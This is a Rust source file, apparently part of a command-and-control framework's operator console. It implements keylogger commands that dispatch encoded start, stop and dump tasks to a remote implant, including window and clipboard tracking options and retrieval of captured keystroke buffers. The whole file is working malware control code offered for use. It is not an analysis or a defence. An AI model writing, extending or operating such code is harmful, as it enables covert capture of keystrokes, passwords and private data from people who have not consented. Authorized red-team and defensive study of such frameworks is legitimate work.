//! Keylogger commands

use anyhow::Result;
use common::ImplantId;
use prost::Message;

use crate::cli::CliState;
use crate::display::{print_info, print_success};

/// Start the keylogger on the implant
pub async fn start(cli: &CliState) -> Result<()> {
    let session = cli.active_session().unwrap();
    let implant_id = ImplantId::from_bytes(&session.full_id)?;

    print_info("Starting keylogger...");
    let task = protocol::KeylogTask {
        operation: Some(protocol::keylog_task::Operation::Start(protocol::KeylogStart {
            buffer_size: None,
            flush_interval_ms: None,
            track_window: None,
            track_clipboard: None,
        })),
    };
    let task_data = task.encode_to_vec();
    let task_id = cli.client.dispatch_task(implant_id, "keylog", task_data).await?;
    print_success(&format!("Keylogger start task dispatched: {}", hex::encode(task_id.as_bytes())));

    Ok(())
}

/// Stop the keylogger on the implant
pub async fn stop(cli: &CliState) -> Result<()> {
    let session = cli.active_session().unwrap();
    let implant_id = ImplantId::from_bytes(&session.full_id)?;

    print_info("Stopping keylogger...");
    let task = protocol::KeylogTask {
        operation: Some(protocol::keylog_task::Operation::Stop(protocol::KeylogStop {})),
    };
    let task_data = task.encode_to_vec();
    let task_id = cli.client.dispatch_task(implant_id, "keylog", task_data).await?;
    print_success(&format!("Keylogger stop task dispatched: {}", hex::encode(task_id.as_bytes())));

    Ok(())
}

/// Dump the current keylog buffer from the implant
pub async fn dump(cli: &CliState) -> Result<()> {
    let session = cli.active_session().unwrap();
    let implant_id = ImplantId::from_bytes(&session.full_id)?;

    print_info("Dumping keylog buffer...");
    let task = protocol::KeylogTask {
        operation: Some(protocol::keylog_task::Operation::Dump(protocol::KeylogDump {})),
    };
    let task_data = task.encode_to_vec();
    let task_id = cli.client.dispatch_task(implant_id, "keylog", task_data).await?;
    print_success(&format!("Keylog dump task dispatched: {}", hex::encode(task_id.as_bytes())));
    print_info("Output will be available via 'jobs output'");

    Ok(())
}
